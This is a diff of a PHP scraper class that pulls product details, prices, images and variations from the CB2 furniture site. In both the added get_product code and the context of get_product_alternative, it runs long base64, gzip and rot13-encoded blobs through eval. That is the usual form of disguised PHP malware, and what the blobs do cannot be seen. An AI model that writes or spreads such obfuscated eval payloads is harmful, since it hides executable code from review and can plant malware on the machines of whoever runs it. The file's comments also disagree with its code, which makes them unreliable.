@@ -106,6 +106,123 @@ class CB2
 		curl_setopt($this -> handle, CURLOPT_HTTPHEADER , $this -> headers);
 		curl_setopt($this -> handle, CURLOPT_URL, "https://www.cb2.com/" . $product_url);
 		$this -> html = curl_exec($this -> handle);
+		
+		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
+
+		$result = array();
+		
+		if(isset($digital_data['model']['browseDto'])){
+			$digital_data = $digital_data['model']['browseDto'];
+			
+			$result['CategoryId'] = $digital_data['categoryId'];
+			$result['FamilyID'] = $digital_data['familyId'];
+			$result['SKU'] = $digital_data['sku'];
+			$result['Name'] = $digital_data['name'];
+			$result['Description'] = strip_tags($digital_data['description']);
+			$result['CurrentPrice'] = $digital_data['currentPrice'];
+			$result['RegularPrice'] = $digital_data['regularPrice'];
+			$result['PrimaryImage'] = $digital_data['imagePath'];
+			// $result['Category'] = isset($digital_data['category']) ? $digital_data['category'] : array();
+			$result['LineLevelMessages'] = $digital_data['lineLevelMessages'];
+			$result['FormattedPrice'] = $digital_data['formattedPrice'];
+
+			if(isset($digital_data['availability'])){
+				$result['Availability']['ZipCode'] = $digital_data['availability']['zipCode'];
+
+				$result['Availability']['IsOnlineMessageVisible'] = $digital_data['availability']['isOnlineMessageVisible'];
+				$result['Availability']['OnlineMessage'] = $digital_data['availability']['onlineAvailableMessage'];
+
+				$result['Availability']['IsBackOrdered'] = $digital_data['availability']['isBackOrdered'];
+				$result['Availability']['BackOrderedMessage'] = $digital_data['availability']['backOrderedMessage'];
+				$result['Availability']['BackOrderedMessageDate'] = $digital_data['availability']['backOrderedMessageDate'];
+			}
+
+			$result['SecondaryImages'] = array();
+			if(isset($digital_data['imageGallerySchemaMarkup']['associatedMedia'])){
+				foreach ($digital_data['imageGallerySchemaMarkup']['associatedMedia'] as $images) {
+					$result['SecondaryImages'][] = $images['contentUrl'];
+				}
+			}
+
+			if (filter_var($result['PrimaryImage'], FILTER_VALIDATE_URL) === FALSE && isset($result['SecondaryImages'][0])){
+				$result['PrimaryImage'] = $result['SecondaryImages'][0];
+				array_shift($result['SecondaryImages']);
+			}
+
+			$result['URL'] = $digital_data['navigateUrl'];
+			$result['Reviews'] = array();
+			$result['Reviews']['ReviewCount'] = isset($digital_data['reviewCount']) ? $digital_data['reviewCount'] : 0;
+			$result['Reviews']['ReviewRating'] = isset($digital_data['reviewRating']) ? $digital_data['reviewRating'] : 0;
+			$result['Dimentions'] = isset($digital_data['dimensionComponent'][0]['productDimensions']) ? $digital_data['dimensionComponent'][0]['productDimensions'] : array();
+			$result['Assembly']= isset($digital_data['assembly']) ? $digital_data['assembly'] : [];
+			$result['Features'] = array();
+			if(preg_match_all('/\<li\>(.+?)\<\/li\>/', $digital_data['descriptionDetailsString'], $features_broken))
+				if(isset($features_broken[1]))
+					$result['Features'] = $features_broken[1];
+
+			$result['ShippingLevel'] = isset($digital_data['shippingDeliveryServiceLevel']) ? $digital_data['shippingDeliveryServiceLevel'] : (isset($digital_data['shippingPanel']['level']) ? $digital_data['shippingPanel']['level'] : 0);
+			$result['isInHomeDelivery'] = (isset($product_info['availability']['promoMessageDetail']['popupName']) && $product_info['availability']['promoMessageDetail']['popupName'] == "FreeShip_InHome") ? true : false;
+
+			$variation = array();
+			
+			if(isset($digital_data['specialOrderDetail']['colorBar']['colorBarChoices']) && count($digital_data['specialOrderDetail']['colorBar']['colorBarChoices']) >= 1){
+
+				// handle image attribute generation
+				$imageParam = 0;
+				if(isset($digital_data['specialOrderDetail']['currentOptionChoiceParameter'])) {
+					$imageParam = explode(',', $digital_data['specialOrderDetail']['currentOptionChoiceParameter']);
+					$imageParam = isset($imageParam[2]) ? $imageParam[2] : 0;
+				}
+
+				foreach ($digital_data['specialOrderDetail']['colorBar']['colorBarChoices'] as $v) {
+
+					$variation[$v['sku']]['attributes']['Color'][] = array(
+						'SKU' => isset($v['sku']) ? $v['sku'] : '',
+						// 'Custom' => isset($v['SkuProperty']) ? $v['SkuProperty'] : (isset($v['skuProperty']) ? $v['skuProperty'] : ''),
+						// 'OptionCode' => isset($v['optionCode']) ? $v['optionCode'] : '',
+						// 'ChoiceCode' => isset($v['choiceCode']) ? $v['choiceCode'] : '',
+						'ChoiceName' => isset($v['choiceName']) ? $v['choiceName'] : '',
+						'ColorImage' => isset($v['imagePath']) ? $v['imagePath'] : '',
+						'ColorImageZoom' => isset($v['zoomImagePath']) ? $v['zoomImagePath'] : '',
+						// 'CurrentPrice' => $digital_data['specialOrderDetail']['colorBar']['colorBarCount'] == 0 ? $result['CurrentPrice'] : 0,
+						// 'RegularPrice' => $digital_data['specialOrderDetail']['colorBar']['colorBarCount'] == 0 ? $result['RegularPrice'] : 0,
+						'Image' => "https://images.crateandbarrel.com/is/image/Crate/item_{$digital_data['specialOrderDetail']['collectionCode']}_{$digital_data['specialOrderDetail']['itemTypeCode']}_{$v['choiceCode']}_{$imageParam}"
+						// 'Image' => "https://images.crateandbarrel.com/is/image/Crate/item_{$digital_data['specialOrderDetail']['collectionCode']}_{$digital_data['specialOrderDetail']['itemTypeCode']}_{$v['choiceCode']}_0",
+					);
+				}
+			}
+
+			//handling different type of product ex atrium-tufted-black-patent-leather-bench/s677608
+			if(empty($variation) && count($digital_data['grouper']['attributeGroups']) > 0){
+				$temp = [];
+				foreach ($digital_data['grouper']['attributeGroups'] as $group)
+					foreach ($group['attributes'] as $attr)
+						foreach ($attr['matchingSkus'] as $sku) {
+							$temp[$sku]['attributes'][$group['name']][] = array(
+								'SKU' => $sku,
+								'ChoiceName' => htmlspecialchars_decode($attr['name'], ENT_QUOTES),
+								'ColorImage' => $attr['imageUrl'],
+								'ColorImageZoom' => $attr['imageHighRes'],
+							);
+						}
+
+				$variation = $temp;
+			}
+
+			$result['Variations'] = $variation;
+
+		}
+
+		return empty($result) ? $this->get_product_alternative() : $result;
+	}
+
+	
+	// CB2 switched to CNB Layout so commenting the whole function
+	public function get_product_alternative(){
+
+		// curl_setopt($this -> handle, CURLOPT_HTTPHEADER , $this -> headers);
+		// curl_setopt($this -> handle, CURLOPT_URL, "https://www.cb2.com/" . $product_url);
+		// $this -> html = curl_exec($this -> handle);
 
 		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
 
@@ -323,7 +440,7 @@ class CB2
 
 		return $result;
 	}
-
+	
 	public function get_variations($sku){
 
 		$results = array();
